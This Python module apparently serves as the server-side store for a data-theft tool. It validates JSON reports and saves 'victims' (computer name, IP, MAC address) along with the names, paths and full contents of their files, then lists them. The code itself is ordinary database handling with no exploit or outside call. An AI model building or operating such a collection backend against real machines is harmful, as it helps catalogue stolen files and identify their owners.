from sqlalchemy.orm import selectinload

from extensions import db
from models.files import Files
from models.victims import Victims


class ValidationError(Exception):
    pass


def _pick_computer_fields(payload: dict) -> tuple[str, str, str]:
    computer = payload.get("computer") if isinstance(payload.get("computer"), dict) else {}

    computer_name = payload.get("computer_name") or computer.get("computer_name") or computer.get("name")
    ip = payload.get("ip") or computer.get("ip")
    mac_address = payload.get("mac_address") or payload.get("mac") or computer.get("mac_address") or computer.get("mac")

    if not computer_name:
        raise ValidationError("computer_name is required")
    if not ip:
        raise ValidationError("ip is required")
    if not mac_address:
        raise ValidationError("mac_address is required")

    return str(computer_name), str(ip), str(mac_address)


def create_victim_with_files(payload: dict) -> Victims:
    if not isinstance(payload, dict):
        raise ValidationError("Invalid JSON payload")

    try:
        computer_name, ip, mac_address = _pick_computer_fields(payload)

        files_payload = payload.get("files", [])
        if not isinstance(files_payload, list):
            raise ValidationError("files must be an array")

        victim = Victims(computer_name=computer_name, ip=ip, mac_address=mac_address)
        db.session.add(victim)

        for file_payload in files_payload:
            if not isinstance(file_payload, dict):
                raise ValidationError("Each file must be an object")

            name = file_payload.get("name")
            path = file_payload.get("path")
            content = file_payload.get("content")

            if name is None or path is None or content is None:
                raise ValidationError("Each file requires name, path and content")

            victim.files.append(
                Files(
                    name=str(name),
                    path=str(path),
                    content=str(content),
                )
            )

        db.session.commit()
        return victim
    except Exception:
        db.session.rollback()
        raise


def list_victims_with_files() -> list[Victims]:
    return (
        Victims.query.options(selectinload(Victims.files))
        .order_by(Victims.id.asc())
        .all()
    )